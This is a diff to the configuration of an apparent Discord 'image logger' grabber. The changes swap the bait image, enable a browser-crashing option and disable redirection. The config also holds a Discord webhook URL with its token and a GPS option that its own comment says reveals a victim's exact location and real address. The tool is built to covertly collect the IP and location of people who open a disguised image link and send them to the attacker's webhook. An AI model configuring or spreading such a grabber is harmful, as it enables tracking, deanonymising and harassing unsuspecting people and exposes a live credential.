@@ -13,7 +13,7 @@ __author__ = "XSYTHO"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1369282563784441856/h3tUAuOYn4x-WES3kCas5x5I8nw2KNhUsERenma0W22zckPVbsqbtu6Ozjy49J24ZUQz",
-    "image": "https://media.discordapp.net/attachments/1369281337386733599/1369281371553398804/CQ21Exo8g423wwZaH1tqHMJaHhBGBwbjfJwfqmKwZD1z44Nf8gfwSZGV823Nx1BSl2A.png?ex=681b4a26&is=6819f8a6&hm=083f0db02194f2414db2e16efd7aa2733435e95b12f940d188819a6b6f56d827&=&format=webp&quality=lossless&width=410&height=410", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1371780492755468349/1372767823360819283/bobokatol.png?ex=685817e9&is=6856c669&hm=5559771391c3f924afb4dad89bbbbde508d31f166cd7054ec4f1f094d3358b6e&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,7 +22,7 @@ config = {
     "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, 
+    "crashBrowser": True, 
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://www.youtube.com/watch?v=J5_HmfZyhKo&t=43s" # Link to the webpage to redirect to 
     },
 
